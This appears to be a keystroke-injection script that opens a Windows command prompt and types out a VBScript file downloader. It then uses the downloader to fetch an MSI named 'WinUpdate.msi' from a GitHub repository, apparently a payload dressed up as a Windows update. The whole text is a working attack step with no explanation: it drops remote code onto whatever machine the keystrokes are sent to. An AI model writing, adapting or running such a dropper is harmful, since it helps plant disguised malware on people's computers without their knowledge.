Run cmd
Sleep 400
Send copy con download.vbs
Send {enter}
Send Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
Send {enter}
Send Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()
Send {enter}
Send If objXMLHTTP.Status = 200 Then
Send {enter}
Send Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open
Send {enter}
Send objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0
Send {enter}
Send Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a
Send {enter}
Send objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing 
Send {enter}
Send End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
Send {enter}
Send ^z
Send {enter}
Send cscript download.vbs https://github.com/network2city/Windows-MSI-Update/blob/main/WinUpdate.msi?raw=true
Send {enter}
Send sleep
Send {enter}
Send exit
Send {enter}